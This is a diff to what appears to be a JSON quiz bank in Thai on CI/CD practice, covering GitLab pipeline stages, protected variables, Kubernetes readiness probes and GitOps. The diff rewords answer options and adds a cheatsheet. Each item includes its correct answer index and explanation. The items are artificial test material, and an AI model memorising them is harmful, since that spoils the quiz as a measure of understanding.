       "code": "stages: [build, test, deploy]\ncompile:\n  stage: build\n  script: npm run build\nunit:\n  stage: test\n  script: npm test\nlint:\n  stage: test\n  script: npm run lint\nrelease:\n  stage: deploy\n  script: ./release.sh",
       "options": [
         "lint ถูกยกเลิกทันที และ release ยังรันต่อได้เพราะอยู่คนละ stage",
-        "unit กับ lint รันต่อกันตามลำดับในไฟล์ จึงไม่มีโอกาสที่ lint จะรันอยู่ตอน unit ล้ม",
+        "unit กับ lint รันตามลำดับในไฟล์ จึงไม่มีโอกาสที่ lint จะรันอยู่ตอน unit ล้ม",
         "pipeline หยุดทุก job ทันทีและทุก stage ถูกทำเครื่องหมายเป็น canceled",
-        "lint รันต่อจนจบ แต่ release ไม่เริ่ม และ pipeline เป็น failed"
+        "lint รันต่อจนจบ แต่ release ไม่เริ่ม และ pipeline มีสถานะ failed"
       ],
       "answer": 3,
       "explain": "job ใน stage เดียวกันรันขนานกัน เมื่อมี job ล้ม pipeline เป็น failed และ job ใน stage ถัดไปไม่เริ่ม ส่วน job ใน stage ปัจจุบันไม่ถูกหยุดและรันต่อจนจบ"
@@ -425,10 +437,10 @@
       "prompt": "ใน pipeline GitLab ด้านล่าง lint ใช้เวลา 20 วินาที แต่ต้องรอ compile ราว 8 นาทีจึงเริ่มรัน เพราะ stage test เริ่มหลัง stage build ผ่าน ควรแก้อย่างไรให้ lint รู้ผลเร็วที่สุด",
       "code": "stages: [build, test]\ncompile:\n  stage: build\n  script: npm run build\nlint:\n  stage: test\n  script: npm run lint",
       "options": [
-        "ใส่ needs: [] ให้ lint เพื่อให้เริ่มทันทีที่สร้าง pipeline",
-        "ย้าย lint ไปไว้ใน stage .post เพื่อให้รันแยกจาก stage อื่นและไม่ถูกบล็อกโดย compile",
-        "ใส่ when: always ให้ lint เพื่อให้เริ่มโดยไม่รอผลของ compile",
-        "ใส่ needs: [compile] ให้ lint เพื่อให้ GitLab จัดคิวให้เร็วขึ้น"
+        "ใส่ needs: [] ให้ lint เพื่อให้เริ่มทันทีที่ pipeline ถูกสร้างขึ้น",
+        "ย้าย lint ไปไว้ใน stage .post เพื่อให้รันแยก ไม่ถูก compile บล็อก",
+        "ใส่ when: always ให้ lint เพื่อให้เริ่มโดยไม่ต้องรอผลของ job compile",
+        "ใส่ needs: [compile] ให้ lint เพื่อให้ GitLab จัดคิวให้เร็วขึ้นกว่าเดิม"
       ],
       "answer": 0,
       "explain": "needs: [] ทำให้ job ข้ามลำดับ stage และเริ่มได้ทันที ส่วน needs: [compile] ยังต้องรอ compile อยู่ดี stage .post รันท้ายสุดจึงช้ากว่าเดิม และ when: always กำหนดว่าจะรันแม้ job ก่อนหน้าล้มไหม แต่ไม่ได้ทำให้ข้ามการรอ stage ก่อนหน้า"
@@ -452,7 +464,7 @@
         "ใส่ resource_group: production ที่ job deploy เพื่อให้รอบอื่นรอจนรอบที่รันอยู่จบ",
         "ใส่ needs: [] ที่ job deploy เพื่อให้ pipeline ใหม่ต่อคิวรอ pipeline เดิม",
         "ตั้ง interruptible: true ที่ job deploy เพื่อให้ pipeline ใหม่ยกเลิกรอบเดิมที่กำลังรัน",
-        "เพิ่ม retry: 2 ที่ job deploy เพื่อให้รอบที่ชนกันลองรันใหม่เองโดยอัตโนมัติ"
+        "เพิ่ม retry: 2 ที่ job deploy เพื่อให้รอบที่ชนกันลองรันใหม่เองโดยอัตโนมัติจนผ่าน"
       ],
       "answer": 0,
       "explain": "resource_group ทำให้ job ใน group เดียวกันรันได้ทีละงานแม้อยู่คนละ pipeline ของโปรเจกต์ งานอื่นจึงรอจนกว่า group จะว่าง needs กำหนดลำดับภายใน pipeline เดียวเท่านั้น interruptible ทำให้งานเดิมถูกยกเลิกกลางคัน ซึ่งขัดกับโจทย์ ส่วน retry ทำงานเมื่อ job ล้มและไม่ได้กันการรันซ้อน"
@@ -460,10 +472,10 @@
     {
       "prompt": "ทีมตั้ง CI/CD variable PROD_DEPLOY_KEY ไว้แบบ protected ใน GitLab นักพัฒนาทดลองรัน job deploy บน feature branch แล้วพบว่า $PROD_DEPLOY_KEY ว่าง ทั้งที่ชื่อสะกดถูก สาเหตุคืออะไร",
       "options": [
-        "variable แบบ masked แสดงเป็นค่าว่างใน log เสมอ จึงมองไม่เห็นค่าที่ job ได้รับไปจริง",
-        "variable ชนิด protected ต้องเป็นชนิด File เท่านั้นจึงจะอ่านค่าได้ในสคริปต์ของ job",
-        "protected variable มีให้เฉพาะ pipeline บน protected branch หรือ protected tag ซึ่ง feature branch ไม่ใช่",
-        "variable ต้องได้รับอนุมัติจาก maintainer ก่อนทุกครั้งที่ job อ่านค่าไปใช้งาน"
+        "variable แบบ masked แสดงเป็นค่าว่างใน log เสมอ จึงมองไม่เห็นค่าที่ job ได้รับไปจริงเลย",
+        "variable ชนิด protected ต้องเป็นชนิด File เท่านั้นจึงจะอ่านค่าได้ในสคริปต์ของ job นั้น",
+        "protected variable มีเฉพาะใน pipeline ของ protected branch หรือ tag ที่ feature branch ไม่ใช่",
+        "variable ต้องได้รับอนุมัติจาก maintainer ก่อนทุกครั้งที่ job จะอ่านค่าไปใช้งานจริง"
       ],
       "answer": 2,
       "explain": "ตัวเลือก protect variable ทำให้ค่านี้ใช้ได้เฉพาะ pipeline บน protected branch หรือ protected tag วิธีนี้กัน branch ทั่วไปไม่ให้เข้าถึง credential ของ production ส่วน masked เป็นเรื่องการซ่อนค่าใน log คนละเรื่องกับการเข้าถึง"
@@ -483,10 +495,10 @@
     {
       "prompt": "ระหว่าง rolling update ของ API ผู้ใช้เจอ error 502 ช่วงสั้น ๆ ทุกครั้ง เพราะ Pod ใหม่ใช้เวลาราว 30 วินาทีในการโหลดข้อมูลก่อนพร้อมรับ request แต่ Service เริ่มส่ง traffic ให้ทันทีที่ container ขึ้น ควรแก้อย่างไรเป็นอันดับแรก",
       "options": [
-        "เพิ่ม readinessProbe เพื่อให้ Pod ที่ยังไม่พร้อมไม่ได้รับ traffic จาก Service",
-        "เพิ่ม livenessProbe เพื่อให้ Kubernetes ส่ง traffic หลังจาก Pod ผ่าน liveness แล้วเท่านั้น",
-        "ใส่ sleep 30 ไว้ท้าย pipeline CI ก่อนขั้น deploy เพื่อรอให้ระบบพร้อม",
-        "เพิ่ม replicas เป็นสองเท่า เพราะ 502 เกิดจาก Pod เก่าไม่พอรับ traffic"
+        "เพิ่ม readinessProbe เพื่อไม่ให้ Pod ที่ยังไม่พร้อมได้รับ traffic จาก Service",
+        "เพิ่ม livenessProbe เพื่อให้ Kubernetes ส่ง traffic หลัง Pod ผ่าน liveness เท่านั้น",
+        "ใส่ sleep 30 ไว้ท้าย pipeline CI ก่อนขั้น deploy เพื่อรอให้ระบบพร้อมรับ traffic",
+        "เพิ่ม replicas เป็นสองเท่า เพราะ 502 เกิดจากจำนวน Pod เก่าไม่พอรับ traffic"
       ],
       "answer": 0,
       "explain": "Pod ที่ readiness probe ยังไม่ผ่านจะไม่ได้รับ traffic ผ่าน Service และ rollout จะรอให้ Pod ใหม่พร้อมก่อน liveness probe มีหน้าที่ตรวจว่าต้อง restart container ไหม ไม่ได้ควบคุมว่าจะส่ง traffic ให้เมื่อไร ส่วน sleep ใน CI ไม่เกี่ยวกับสถานะของ Pod ในคลัสเตอร์"
@@ -496,7 +508,7 @@
       "options": [
         "Deployment controller ของ Kubernetes ย้อนค่ากลับเองทุกครั้งที่มีคนแก้ด้วย kubectl",
         "agent เปรียบเทียบสถานะจริงกับค่าใน Git อย่างต่อเนื่อง และดึงค่ากลับให้ตรงกับ Git",
-        "pipeline CI ถูก trigger ใหม่โดยคำสั่ง kubectl แล้ว push ค่าเดิมกลับเข้าคลัสเตอร์",
+        "pipeline CI ถูก trigger ใหม่โดยคำสั่ง kubectl แล้ว push ค่าเดิมกลับเข้าคลัสเตอร์อีกครั้ง",
         "kubectl scale มีผลชั่วคราวตามค่าเริ่มต้นและหมดอายุเองหลังไม่กี่นาที"
       ],
       "answer": 1,
@@ -682,5 +694,17 @@
       "url": "https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/",
       "note": "readiness probe กับการรับ traffic ผ่าน Service"
     }
+  ],
+  "cheatsheet": [
+    "Continuous Delivery ให้คนอนุมัติขึ้น production; Continuous Deployment ปล่อยอัตโนมัติเมื่อผ่าน pipeline",
+    "วาง check ที่เร็วและจับปัญหาบ่อยไว้ก่อนเพื่อ fail fast; deploy ต้องรอทุก check ที่จำเป็นผ่าน",
+    "GitHub Actions รัน jobs ขนานกันโดย default; ใช้ needs กำหนดให้รอกัน ส่วน steps ใน job รันตามลำดับ",
+    "ใช้ OIDC แลก token อายุสั้นเป็น cloud credentials ชั่วคราว แทนการเก็บ access key อายุยาว",
+    "Build ครั้งเดียวต่อ commit แล้วส่ง artifact เดิมผ่านทุก environment; ใช้ tag แบบ immutable เช่น commit SHA",
+    "Migration แบบ expand/contract ต้องให้โค้ดเก่าและใหม่ใช้ schema ได้ ก่อนลบของเก่าใน release ถัดไปเพื่อรองรับ rollback",
+    "ป้องกัน script injection โดยส่ง input ที่ไม่น่าไว้ใจผ่าน step env แล้วอ้าง shell variable ด้วย double quote",
+    "Artifact ใช้ส่งไฟล์ระหว่าง jobs; cache ใช้เร่ง run ถัดไป และ job ต้องทำงานได้แม้ cache หาย",
+    "GitLab stage ถัดไปรอ stage ก่อนหน้าสำเร็จครบ แต่ needs: [] ให้ job เริ่มทันทีโดยข้ามลำดับ stage",
+    "GitOps agent reconcile สถานะจริงกับ desired state ใน Git; การแก้ด้วยมืออาจถูกย้อนกลับ จึงแก้ผ่าน commit หรือ PR"
   ]
 }
